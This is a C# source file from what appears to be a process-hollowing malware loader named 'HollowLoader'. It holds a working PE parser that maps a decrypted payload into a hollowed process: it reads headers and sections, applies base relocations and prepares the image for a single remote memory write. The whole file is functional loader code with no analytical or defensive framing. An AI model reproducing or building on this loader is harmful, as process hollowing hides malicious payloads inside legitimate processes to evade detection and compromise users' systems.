using System;
using System.Collections.Generic;

namespace HollowLoader
{
    /// <summary>
    /// Minimal in-memory PE parser used to map the decrypted payload image into
    /// the hollowed process (headers, sections, entry point, relocations).
    /// </summary>
    internal sealed class PeImage
    {
        internal struct Section
        {
            internal uint VirtualSize;
            internal uint VirtualAddress;
            internal uint SizeOfRawData;
            internal uint PointerToRawData;
        }

        internal ushort Machine;
        internal bool Is64Bit;
        internal ulong ImageBase;
        internal uint SizeOfImage;
        internal uint SizeOfHeaders;
        internal uint AddressOfEntryPoint;
        internal uint SectionAlignment;
        internal uint FileAlignment;
        internal uint RelocRva;
        internal uint RelocSize;
        internal bool HasRelocations;
        internal Section[] Sections;

        internal byte[] Raw;

        internal static PeImage Parse(byte[] data)
        {
            if (data == null || data.Length < 0x40) return null;
            uint peOffset = BitConverter.ToUInt32(data, 0x3C);
            if (peOffset + 0x18 + 0x70 >= data.Length) return null;
            if (BitConverter.ToUInt32(data, (int)peOffset) != 0x00004550) return null; // "PE\0\0"

            var pe = new PeImage { Raw = data };
            pe.Machine = BitConverter.ToUInt16(data, (int)peOffset + 4);
            pe.Is64Bit = pe.Machine == 0x8664;
            if (pe.Machine != 0x8664 && pe.Machine != 0x014C)
                return null; // unsupported architecture

            int optOff = (int)peOffset + 0x18;
            ushort magic = BitConverter.ToUInt16(data, optOff);
            bool opt64 = magic == 0x20B;
            if (!opt64 && magic != 0x10B) return null;

            if (opt64)
            {
                pe.ImageBase = BitConverter.ToUInt64(data, optOff + 0x18);
                pe.SizeOfImage = BitConverter.ToUInt32(data, optOff + 0x38);
                pe.SizeOfHeaders = BitConverter.ToUInt32(data, optOff + 0x3C);
                pe.AddressOfEntryPoint = BitConverter.ToUInt32(data, optOff + 0x10);
                pe.SectionAlignment = BitConverter.ToUInt32(data, optOff + 0x20);
                pe.FileAlignment = BitConverter.ToUInt32(data, optOff + 0x24);
                pe.RelocRva = BitConverter.ToUInt32(data, optOff + 0x70 + 5 * 8);
                pe.RelocSize = BitConverter.ToUInt32(data, optOff + 0x70 + 5 * 8 + 4);
            }
            else
            {
                pe.ImageBase = BitConverter.ToUInt32(data, optOff + 0x1C);
                pe.SizeOfImage = BitConverter.ToUInt32(data, optOff + 0x38);
                pe.SizeOfHeaders = BitConverter.ToUInt32(data, optOff + 0x3C);
                pe.AddressOfEntryPoint = BitConverter.ToUInt32(data, optOff + 0x10);
                pe.SectionAlignment = BitConverter.ToUInt32(data, optOff + 0x20);
                pe.FileAlignment = BitConverter.ToUInt32(data, optOff + 0x24);
                pe.RelocRva = BitConverter.ToUInt32(data, optOff + 0x60 + 5 * 8);
                pe.RelocSize = BitConverter.ToUInt32(data, optOff + 0x60 + 5 * 8 + 4);
            }

            pe.HasRelocations = pe.RelocRva != 0 && pe.RelocSize != 0;

            ushort numberOfSections = BitConverter.ToUInt16(data, (int)peOffset + 6);
            int sectionTable = optOff + (opt64 ? 0xF0 : 0xE0);
            var sections = new List<Section>(numberOfSections);
            for (int i = 0; i < numberOfSections; i++)
            {
                int off = sectionTable + i * 40;
                if (off + 40 > data.Length) break;
                sections.Add(new Section
                {
                    VirtualSize = BitConverter.ToUInt32(data, off + 8),
                    VirtualAddress = BitConverter.ToUInt32(data, off + 12),
                    SizeOfRawData = BitConverter.ToUInt32(data, off + 16),
                    PointerToRawData = BitConverter.ToUInt32(data, off + 20)
                });
            }
            pe.Sections = sections.ToArray();
            return pe;
        }

        /// <summary>
        /// Build the fully mapped image (headers + sections, zero-filled slack,
        /// relocations applied for the target base) ready for one remote write.
        /// </summary>
        internal byte[] BuildMappedImage(ulong targetBase)
        {
            byte[] image = new byte[SizeOfImage];

            int headers = (int)Math.Min(SizeOfHeaders, image.Length);
            Buffer.BlockCopy(Raw, 0, image, 0, headers);

            foreach (Section s in Sections)
            {
                int dst = (int)s.VirtualAddress;
                if (dst < 0 || dst >= image.Length) continue;
                int count = (int)Math.Min(s.SizeOfRawData, image.Length - dst);
                int src = (int)s.PointerToRawData;
                if (src < 0 || src + count > Raw.Length) continue;
                Buffer.BlockCopy(Raw, src, image, dst, count);
            }

            if (HasRelocations && ImageBase != targetBase)
                ApplyRelocations(image, targetBase);

            return image;
        }

        private void ApplyRelocations(byte[] image, ulong targetBase)
        {
            long delta = (long)(targetBase - ImageBase);
            uint off = RelocRva;
            uint end = RelocRva + RelocSize;

            while (off + 8 <= end && off < (uint)image.Length)
            {
                uint pageRva = BitConverter.ToUInt32(image, (int)off);
                uint blockSize = BitConverter.ToUInt32(image, (int)off + 4);
                if (blockSize < 8) break;

                int count = (int)((blockSize - 8) / 2);
                for (int i = 0; i < count; i++)
                {
                    ushort entry = BitConverter.ToUInt16(image, (int)off + 8 + i * 2);
                    int type = entry >> 12;
                    int offset = entry & 0xFFF;
                    int dst = (int)(pageRva + offset);
                    if (dst < 0 || dst + (Is64Bit ? 8 : 4) > image.Length) continue;

                    if (Is64Bit && type == 0xA) // IMAGE_REL_BASED_DIR64
                    {
                        ulong value = BitConverter.ToUInt64(image, dst);
                        BitConverter.GetBytes(value + (ulong)delta).CopyTo(image, dst);
                    }
                    else if (!Is64Bit && type == 0x3) // IMAGE_REL_BASED_HIGHLOW
                    {
                        uint value = BitConverter.ToUInt32(image, dst);
                        BitConverter.GetBytes((uint)(value + delta)).CopyTo(image, dst);
                    }
                }
                off += blockSize;
            }
        }
    }
}
